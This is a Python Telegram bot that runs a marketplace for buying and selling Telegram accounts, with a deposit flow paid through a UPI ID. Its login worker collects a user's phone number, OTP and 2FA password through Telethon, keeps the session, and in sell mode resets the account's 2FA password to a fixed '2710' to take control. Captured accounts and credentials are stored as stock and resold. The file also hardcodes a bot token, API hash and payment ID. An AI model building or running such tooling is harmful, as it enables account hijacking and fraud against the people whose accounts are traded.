import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
from telethon.errors import SessionPasswordNeededError
import asyncio, os, threading, re, time, json
from flask import Flask

# --- ANTI-CRASH SERVER ---
app = Flask('')
@app.route('/')
def home(): return "<h1>SYSTEM 100% OPERATIONAL 🚀</h1>"
threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080), daemon=True).start()

# --- CONFIGURATION ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ADVANCED DATABASE SYSTEM ---
DB_PATH = 'bot_db.json'
def load_db():
    if not os.path.exists(DB_PATH):
        return {'users': {}, 'admins': [OWNER_ID], 'upi': 'abhay-op.315@ptyes', 'stock': {}, 'sell_rates': {}, 'buy_rates': {}}
    with open(DB_PATH, 'r') as f: return json.load(f)

def save_db():
    with open(DB_PATH, 'w') as f: json.dump(db, f, indent=4)

db = load_db()
if not os.path.exists('sessions'): os.makedirs('sessions')
active_logins = {}

# --- HELPER FUNCTIONS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📊 STATS', '📞 SUPPORT')
    return markup

# --- START & REGISTRATION ---
@bot.message_handler(commands=['start'])
def start(m):
    uid = str(m.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {'balance': 0, 'joined': time.ctime()}
        save_db()
    bot.send_message(m.chat.id, "🔥 **PRIME MASTER BOT v15.0**\nAll Advanced Features Loaded.", reply_markup=get_main_menu())

# --- ADMIN COMMAND CENTER (FIXED) ---
@bot.message_handler(commands=['admin'])
def admin_panel(m):
    if not is_admin(m.from_user.id): return
    text = (
        "👑 **ADMIN CONTROL PANEL**\n\n"
        "📍 `/addcountry [NAME] [BUY] [SELL]`\n"
        "📍 `/addbal [ID] [AMT]`\n"
        "📍 `/setupi [UPI_ID]`\n"
        "📍 `/addstock` (Direct ID Login to Stock)\n"
        "📍 `/broadcast [MSG]`"
    )
    bot.send_message(m.chat.id, text)

# --- FEATURE: ADD STOCK (ID LOGIN TO BOT STOCK) ---
@bot.message_handler(commands=['addstock'])
def add_stock_init(m):
    if not is_admin(m.from_user.id): return
    msg = bot.send_message(m.chat.id, "🌍 **Country Name enter karein:**")
    bot.register_next_step_handler(msg, stock_country_step)

def stock_country_step(m):
    country = m.text.upper()
    msg = bot.send_message(m.chat.id, f"📞 **{country} ke liye Phone Number (+ format):**")
    bot.register_next_step_handler(msg, lambda ms: threading.Thread(target=login_worker, args=(m.chat.id, ms.text, country, "stock")).start())

# --- FEATURE: DEPOSIT (STRICT VALIDATION) ---
@bot.message_handler(func=lambda m: m.text == '📥 DEPOSIT')
def dep_start(m):
    msg = bot.send_message(m.chat.id, "💵 **Amount (₹) enter karein:**")
    bot.register_next_step_handler(msg, dep_utr_step)

def dep_utr_step(m):
    amt = m.text
    msg = bot.send_message(m.chat.id, f"💳 Pay to: `{db['upi']}`\n\nAb **12-digit UTR** bhejein:")
    bot.register_next_step_handler(msg, dep_ss_step, amt)

def dep_ss_step(m, amt):
    utr = m.text.strip()
    if len(utr) != 12: return bot.send_message(m.chat.id, "❌ Invalid UTR.")
    msg = bot.send_message(m.chat.id, "📸 **Payment Screenshot** bhejein:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(m, amt, utr):
    if m.content_type != 'photo': return bot.send_message(m.chat.id, "❌ Photo missing.")
    mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"adm_d_a_{m.from_user.id}_{amt}"), types.InlineKeyboardButton("❌ REJECT", callback_data=f"adm_d_r_{m.from_user.id}"))
    for a in db['admins']: bot.send_photo(a, m.photo[-1].file_id, caption=f"💰 DEPOSIT: ₹{amt}\nUTR: {utr}\nID: `{m.from_user.id}`", reply_markup=mk)
    bot.send_message(m.chat.id, "⏳ Admin review pending...")

# --- LOGIN WORKER ENGINE (AUTO 2FA CHANGE) ---
def login_worker(chat_id, phone, country, mode):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    async def run():
        await client.connect()
        req = await client.send_code_request(phone)
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country, 'mode': mode}
        bot.send_message(chat_id, "📩 **OTP Sent!** Enter code:")
        bot.register_next_step_handler_by_chat_id(chat_id, otp_verify)
    loop.run_until_complete(run())

def otp_verify(m):
    d = active_logins.get(m.chat.id)
    async def check():
        try:
            await d['client'].sign_in(d['phone'], m.text.strip(), phone_code_hash=d['hash'])
            await finalize_bot(m, d)
        except SessionPasswordNeededError:
            bot.send_message(m.chat.id, "🔐 **2FA Password:**")
            bot.register_next_step_handler(m, pass_verify)
    d['loop'].run_until_complete(check())

def pass_verify(m):
    d = active_logins.get(m.chat.id)
    async def check():
        await d['client'].sign_in(password=m.text.strip())
        await finalize_bot(m, d, m.text.strip())
    d['loop'].run_until_complete(check())

async def finalize_bot(m, d, pwd="None"):
    if d['mode'] == "sell":
        try:
            await d['client'](functions.account.UpdatePasswordSettingsRequest(new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="bot")))
        except: pass
        mk = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"adm_s_a_{m.chat.id}_{d['country']}"))
        for a in db['admins']: bot.send_message(a, f"📦 **SELL REQ**\nNum: `{d['phone']}`\nPass: `2710`", reply_markup=mk)
        bot.send_message(m.chat.id, "✅ ID Connected! Admin approval pending.")
    else:
        db['stock'].setdefault(d['country'], []).append(f"{d['phone']}:PASS:{pwd}")
        save_db()
        bot.send_message(m.chat.id, f"✅ Added to {d['country']} Stock.")

# --- CALLBACKS (GLOBAL FIXED) ---
@bot.callback_query_handler(func=lambda call: True)
def cb_handler(call):
    p = call.data.split('_')
    if p[0] == 'adm':
        if p[1] == 'd' and p[2] == 'a': # Dep Approve
            db['users'][p[3]]['balance'] += int(p[4])
            save_db()
            bot.send_message(int(p[3]), f"✅ ₹{p[4]} Credited!")
            bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
    elif p[0] == 'buyid':
        c = p[1]
        price = db['buy_rates'].get(c, 0)
        if db['users'][str(call.from_user.id)]['balance'] < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "No Stock/Balance", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][str(call.from_user.id)]['balance'] -= price
        save_db()
        bot.send_message(call.from_user.id, f"🛒 **PURCHASED**\nData: `{data}`\nPass: 2710")

# --- USER OPTIONS ---
@bot.message_handler(func=lambda m: m.text == '🛒 BUY ID')
def h_buy(m):
    if not db['buy_rates']: return bot.send_message(m.chat.id, "❌ Market Empty.")
    mk = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        stk = len(db['stock'].get(c, []))
        mk.add(types.InlineKeyboardButton(f"{c} | ₹{p} | Stock: {stk}", callback_data=f"buyid_{c}"))
    bot.send_message(m.chat.id, "🛒 **MARKET:**", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == '💰 BALANCE')
def h_bal(m):
    bot.send_message(m.chat.id, f"💳 Balance: ₹{db['users'].get(str(m.from_user.id), {}).get('balance',0)}")

@bot.message_handler(commands=['addcountry'])
def add_c(m):
    if not is_admin(m.from_user.id): return
    try:
        _, n, b, s = m.text.split()
        db['buy_rates'][n.upper()], db['sell_rates'][n.upper()] = int(b), int(s)
        db['stock'].setdefault(n.upper(), [])
        save_db(); bot.reply_to(m, "✅ Done.")
    except: pass

bot.polling(none_stop=True)
